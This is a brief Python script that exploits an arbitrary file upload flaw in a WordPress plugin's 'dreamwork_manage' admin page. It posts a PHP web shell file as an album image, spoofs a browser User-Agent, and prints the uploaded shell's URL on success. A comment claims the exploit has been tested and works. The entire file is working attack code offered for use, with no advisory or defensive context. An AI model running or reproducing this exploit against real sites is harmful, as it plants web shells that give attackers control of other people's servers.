import requests
import sys
import os

#tested True =  exploit work

def dreamworkgallery(target):
    site = target + "wp-admin/admin.php?page=dreamwork_manage"
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"}
    payload = {'album_img':open('../shells/Orusula.php','rb')}
    data = {
        'task':'drm_add_new_album',
        'album_name':'Arbitrary File Upload',
        'album_desc':'Arbitrary File Upload'
        }
    s = requests.session()
    resp = s.post(site, files=payload, data=data, headers=headers)
    text = resp.text
    if "Orusula" in text:
        try:
            text = text.split("=>")
            result = site + text[-1]
            print("[+] DreamWork {}".format(result))
        except:
            print("[-] DreamWork")
    else:
        print("[-] DreamWork")